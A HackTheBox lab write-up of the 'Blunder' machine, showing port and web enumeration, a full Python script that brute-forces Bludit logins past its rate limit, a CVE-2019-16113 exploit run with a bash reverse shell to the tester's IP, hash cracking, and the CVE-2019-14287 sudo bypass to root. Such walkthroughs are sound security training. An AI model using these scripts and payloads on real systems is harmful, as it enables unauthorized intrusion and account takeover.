---
title: Blunder Machine Writeup- HackTheBox
author: pwnd_root
date: 2020-07-09 23:30:00 +0530
excerpt: Note that this is still an active box, so it's highly recommended that you try a bit harder before heading inside. 
         Feel free to reach me on my socials for spoiler-free nudges.
thumbnail: /assets/img/posts/blunder/info.png
categories: [HackTheBox, Machine]
tags: [htb, Bludit, CMS, sudo, linux, without metasploit]
---
> Note that this is still an active box, so it's highly recommended that you try a bit harder before heading inside. 
         Feel free to reach me on my socials for spoiler-free nudges.

*[Image: Info Card]*
## Methodology
1. Port Enumeration
2. Web Service Enumeration
3. CMS Vulnerabilities found
4. Foothold gained as www-data
5. User access gained through sensitive hashes on the target
6. Root access gained through sudo

## Port Enumeration
The nmap recon of the target had revealed that it has only the web port (80) open, with no known vulnerability reported
for exploitation. The scan however listed a directory, **admin**.
```
[pwnd_root@manjaro Blunder]$ targetRecon 10.10.10.191
[+] Open Ports Scan
        80      http
[+] Scripts Scan
                 nmap -sV -sC --script=vuln -p 80 10.10.10.191

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-09 03:12 IST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.191 (10.10.10.191)
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/admin/: Possible admin folder
|   /admin/account.php: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /admin/login.php: Possible admin folder
|   /admin/admin.php: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /admin/login.html: Possible admin folder
|   /admin/admin.html: Possible admin folder
|   /admin/home.php: Possible admin folder
|   /admin/controlpanel.php: Possible admin folder
|   /admin/account.html: Possible admin folder
|   /admin/admin_login.html: Possible admin folder
|   /admin/cp.php: Possible admin folder
|   /admin/admin_login.php: Possible admin folder
|   /admin/admin-login.php: Possible admin folder
|   /admin/home.html: Possible admin folder
|   /admin/admin-login.html: Possible admin folder
|   /admin/adminLogin.html: Possible admin folder
|   /admin/controlpanel.html: Possible admin folder
|   /admin/cp.html: Possible admin folder
|   /admin/adminLogin.php: Possible admin folder
|   /admin/account.cfm: Possible admin folder
|   /admin/index.cfm: Possible admin folder                                                                                                                                      
|   /admin/login.cfm: Possible admin folder                                                                                                                                      
|   /admin/admin.cfm: Possible admin folder                                                                                                                                      
|   /admin/admin_login.cfm: Possible admin folder                                                                                                                                
|   /admin/controlpanel.cfm: Possible admin folder                                                                                                                               
|   /admin/cp.cfm: Possible admin folder                                                                                                                                         
|   /admin/adminLogin.cfm: Possible admin folder                                                                                                                                 
|   /admin/admin-login.cfm: Possible admin folder                                                                                                                                
|   /admin/home.cfm: Possible admin folder                                                                                                                                       
|   /admin/account.asp: Possible admin folder                                                                                                                                    
|   /admin/index.asp: Possible admin folder                                                                                                                                      
|   /admin/login.asp: Possible admin folder                                                                                                                                      
|   /admin/admin.asp: Possible admin folder                                                                                                                                      
|   /admin/home.asp: Possible admin folder                                                                                                                                       
|   /admin/controlpanel.asp: Possible admin folder                                                                                                                               
|   /admin/admin-login.asp: Possible admin folder                                                                                                                                
|   /admin/cp.asp: Possible admin folder                                                                                                                                         
|   /admin/admin_login.asp: Possible admin folder                                                                                                                                
|   /admin/adminLogin.asp: Possible admin folder                                                                                                                                 
|   /admin/account.aspx: Possible admin folder                                                                                                                                   
|   /admin/index.aspx: Possible admin folder                                                                                                                                     
|   /admin/login.aspx: Possible admin folder                                                                                                                                     
|   /admin/admin.aspx: Possible admin folder                                                                                                                                     
|   /admin/home.aspx: Possible admin folder                                                                                                                                      
|   /admin/controlpanel.aspx: Possible admin folder                                                                                                                              
|   /admin/admin-login.aspx: Possible admin folder                                                                                                                               
|   /admin/cp.aspx: Possible admin folder                                                                                                                                        
|   /admin/admin_login.aspx: Possible admin folder                                                                                                                               
|   /admin/adminLogin.aspx: Possible admin folder                                                                                                                                
|   /admin/index.jsp: Possible admin folder                                                                                                                                      
|   /admin/login.jsp: Possible admin folder                                                                                                                                      
|   /admin/admin.jsp: Possible admin folder                                                                                                                                      
|   /admin/home.jsp: Possible admin folder                                                                                                                                       
|   /admin/controlpanel.jsp: Possible admin folder                                                                                                                               
|   /admin/admin-login.jsp: Possible admin folder                                                                                                                                
|   /admin/cp.jsp: Possible admin folder                                                                                                                                         
|   /admin/account.jsp: Possible admin folder                                                                                                                                    
|   /admin/admin_login.jsp: Possible admin folder                                                                                                                                
|   /admin/adminLogin.jsp: Possible admin folder                                                                                                                                 
|   /admin/backup/: Possible backup                                                                                                                                              
|   /admin/download/backup.sql: Possible database backup                                                                                                                         
|   /robots.txt: Robots file                                                                                                                                                     
|   /admin/upload.php: Admin File Upload                                                                                                                                         
|   /admin/CiscoAdmin.jhtml: Cisco Collaboration Server                                                                                                                          
|   /.gitignore: Revision control ignore file                                                                                                                                    
|   /admin/libraries/ajaxfilemanager/ajaxfilemanager.php: Log1 CMS                                                                                                               
|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload                                                                     
|   /admin/includes/tiny_mce/plugins/tinybrowser/upload.php: CompactCMS or B-Hind CMS/FCKeditor File upload                                                                      
|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload                                                                       
|   /admin/jscript/upload.php: Lizard Cart/Remote File upload                                                                                                                    
|   /admin/jscript/upload.html: Lizard Cart/Remote File upload                                                                                                                   
|   /admin/jscript/upload.pl: Lizard Cart/Remote File upload                                                                                                                     
|   /admin/jscript/upload.asp: Lizard Cart/Remote File upload                                                                                                                    
|_  /admin/environment.xml: Moodle files                                                                                                                                         
| http-fileupload-exploiter:                                                                                                                                                     
|                                                                                                                                                                                
|     Couldn't find a file-type field.                                                                                                                                           
|                                                                                                                                                                                
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-sql-injection: 
|   Possible sqli for queries:
|     http://10.10.10.191:80/bl-kernel/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=D%3bO%3dD%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=M%3bO%3dD%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=S%3bO%3dD%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.191:80/bl-kernel/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|_    http://10.10.10.191:80/bl-kernel/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|_      CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1292.54 seconds

[+] Summary 
80      http    Apache httpd 2.4.41
                No vuln found

```

## Web Service Enumeration
Browsing to [http://10.10.10.191/admin ](http://10.10.10.191/admin) had revealed the sign in page of **Bludit CMS** and
the page-source had revealed the version as **3.9.2**. Checking the source code and issues of the CMS application on 
github is always a good idea, as in this case it revealed a [code execution vulnerability](https://github.com/bludit/bludit/issues/1081)
with the installed version. However, this exploit requires a working set of credentials, which warrants further
enumeration. The usual *nikto* and *directory buster* enumerations did not offer any useful information.

### wfuzz Enumeration
After *nikto* and *dirb* scans a *wfuzz* scan to brute force all txt files hosted on the server was carried out as follows.
``` 
[pwnd_root@manjaro Blunder]$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 403,404 -u "http://10.10.10.191/FUZZ.txt" -t 50 
******************************************************** 
* Wfuzz 2.4.6 - The Web Fuzzer                         * 
******************************************************** 
 
Target: http://10.10.10.191/FUZZ.txt 
Total requests: 4658 
 
=================================================================== 
ID           Response   Lines    Word     Chars       Payload                                                                                                          
=================================================================== 
 
000003519:   200        1 L      4 W      22 Ch       "robots"                                                                                                         
000004125:   200        4 L      23 W     118 Ch      "todo"                                                                                                           
 
Total time: 55.35156 
Processed Requests: 4658 
Filtered Requests: 4656 
Requests/sec.: 84.15299
```
The *robots.txt* did not list any hidden folders, however *todo.txt* contained some sort of to-do list and most importantly
a user name- ***fergus***.
*[Image: todo.txt]*
### Bludit Login Brute Force
While checking for vulnerabilities on Bludit 3.9.2 a mechanism to 
[bypass anti-brute force protection](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) was found, along
with a simple POC. For a word list to go with this brute-force, one was generated using *cewl* on the website as,
```cewl -d 5 -m 4 http://10.10.10.191 > wordlist.txt``` . Using the POC, a python module to brute force the password was
written and the same is given below.
```python
#!/usr/bin/env python3
import re
import requests

host = "http://10.10.10.191" # change to the appropriate URL

login_url = host + '/admin/login'
username = 'fergus' # Change to the appropriate username
fname = "/home/pwnd_root/HTB/Blunder/wordlist.txt" #change this to the appropriate file you can specify the full path to the file

with open (fname) as fl:
    line = fl.readlines ()
    wordlist = [x.strip() for x in line]

for password in wordlist:
    session = requests.Session ()
    login_page = session.get (login_url)
    csrf_token = re.search ('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format (p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post (login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers ['location']:
            print ()
            print ('SUCCESS: Password found!')
            print ('Use {u}:{p} to login.'.format(u = username, p = password))
            print ()
            break
```
With this module, the password of the user *fergus* was brute forced as ***RolandDeschain***.
``` 
[pwnd_root@manjaro Blunder]$ python BluditBruteForce.py 
[*] Trying: Load
[*] Trying: Plugins
[*] Trying: Include
.
.
.
[*] Trying: character
[*] Trying: RolandDeschain

SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```
## Initial Foothold
With a set of working credentials found, the remote code vulnerability discussed earlier can now be used. A well written
python exploit to leverage the vulnerability into RCE was found on GitHub as 
[CVE-2019-16113.py](https://github.com/cybervaca/CVE-2019-16113/blob/master/CVE-2019-16113.py). Using the module a reverse
shell was gained as follows.
```
[pwnd_root@manjaro Blunder]$ python BluditReverseShell.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c "bash -c 'bash -i >& /dev/tcp/10.10.14.16/9090 0>&1'"      
 
 
╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔ 
╠╩╗│  │ │ │││ │   ╠═╝║║║║║║ 
╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝ 
 
 CVE-2019-16113 CyberVaca 
 
 
[+] csrf_token: ae06067214d4274ec22c8ebcbcd04c05d5564466 
[+] cookie: 926lpeatus8i719l3dcv80vih7 
[+] csrf_token: 4af3f04b71272422d4c0ebf7fcaff3872fad1040 
[+] Uploading ztozltge.jpg 
[+] Executing command: bash -c 'bash -i >& /dev/tcp/10.10.14.16/9090 0>&1' 
[+] Delete: .htaccess 
[+] Delete: ztozltge.jpg
```
*[Image: Initial Shell]*

Per the screenshot, the reverse shell was from *www-data* with the lowest privileges, with no access to read the 
*user.txt* file. Enumeration on the target with this reverse shell revealed a file, ***users.php***, 
that contains the password hash for user ***hugo***.
```php 
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```
> The file users.php was found in ```/var/www/bludit-3.10.0a/bl-content/databases```

The hash *faca404fd5c0a31cf1897b823c695c85cffeb98d* was cracked into ***Password120***, using *john*.

```
[pwnd_root@manjaro Blunder]$ john --wordlist=rockyou.txt hash --format=raw-sha1  
Using default input encoding: UTF-8 
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x]) 
Warning: no OpenMP support for this hash type, consider --fork=4 
Press 'q' or Ctrl-C to abort, almost any other key for status 
Warning: Only 1 candidate left, minimum 4 needed for performance. 
Password120      (?) 
1g 0:00:00:01 DONE (2020-07-09 20:40) 0.8000g/s 11474Kp/s 11474Kc/s 11474KC/s Password120 
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably 
Session completed
```
The current session was switched to user *hugo* using the **su** command as ```su hugo``` and the user flag was read.

*[Image: User Shell]*

## Root Access
Checking for the *sudo* permission of *hugo* revealed that the user can run the binary */bin/bash* as any user, *except root*.
```
hugo@blunder:~$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```
```
hugo@blunder:~$ sudo -V
sudo -V
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
```
However there is a workaround, specified on [CVE-2019-14287](https://access.redhat.com/security/cve/cve-2019-14287),
with which the binary can be run as *root*. The command used was ```sudo -u#-1 /bin/bash```, which resulted in a 
root shell.

*[Image: Root Shell]*